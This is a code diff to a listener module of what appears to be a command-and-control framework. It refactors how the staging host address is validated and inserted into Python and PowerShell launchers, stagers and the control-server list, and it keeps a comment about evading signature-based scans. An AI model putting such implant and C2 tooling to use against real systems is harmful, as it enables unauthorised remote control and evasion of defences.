@@ -64,8 +64,7 @@ class Listener:
             "Host": {
                 "Description": "Hostname/IP for staging.",
                 "Required": True,
-                # todo: port is causing issues and making it always attached
-                "Value": f"http://{helpers.lhost()}:{80}",
+                "Value": f"http://{helpers.lhost()}",
             },
             "BindIP": {
                 "Description": "The IP to bind to on the control server.",
@@ -141,6 +140,7 @@ class Listener:
         self.thread = None
 
         # optional/specific for this module
+        self.host_address = None
         self.app = None
 
         # randomize the length of the default_response and index_page headers to evade signature based scans
@@ -215,6 +215,12 @@ class Listener:
             profile.stager.client.metadata.header("Cookie")
             profile.stager.server.output.transforms = []
             profile.stager.server.output.print_()
+
+            self.host_address, err = (
+                self.mainMenu.listenersv2.validate_listener_address(self.options)
+            )
+            if err:
+                return False, err
 
             if profile.validate():
                 # store serialized profile for use across sessions
@@ -469,7 +475,7 @@ class Listener:
             if safe_checks and safe_checks.lower() == "true":
                 launcherBase += listener_util.python_safe_checks()
 
-            launcherBase += f"server='{host}'\n"
+            launcherBase += f"server='{self.host_address}'\n"
 
             # ==== CONFIGURE PROXY ====
             if proxy and proxy.lower() != "none":
@@ -650,7 +656,7 @@ class Listener:
                 "kill_date": killDate,
                 "staging_key": stagingKey,
                 "session_cookie": "",
-                "host": host,
+                "host": self.host_address,
                 "stage_1": stage1,
                 "stage_2": stage2,
                 "agent_private_cert_key": private_key_array,
@@ -658,10 +664,6 @@ class Listener:
                 "agent_public_cert_key": public_key_array,
             }
             stager = template.render(template_options)
-
-            # make sure the server ends with "/"
-            if not host.endswith("/"):
-                host += "/"
 
             # patch in custom headers
             if profile.stager.client.headers:
@@ -714,7 +716,7 @@ class Listener:
                 "agent_public_cert_key": self.agent_public_cert_key,
                 "profile": profileStr,
                 "session_cookie": "",
-                "host": host,
+                "host": self.host_address,
                 "stage_1": stage1,
                 "stage_2": stage2,
             }
@@ -854,7 +856,7 @@ class Listener:
 
         if language.lower() == "powershell":
             # PowerShell
-            updateServers = f'$Script:ControlServers = @("{host}");'
+            updateServers = f'$Script:ControlServers = @("{self.host_address}");'
             updateServers += "$Script:ServerIndex = 0;"
 
             # ==== HANDLE SSL ====
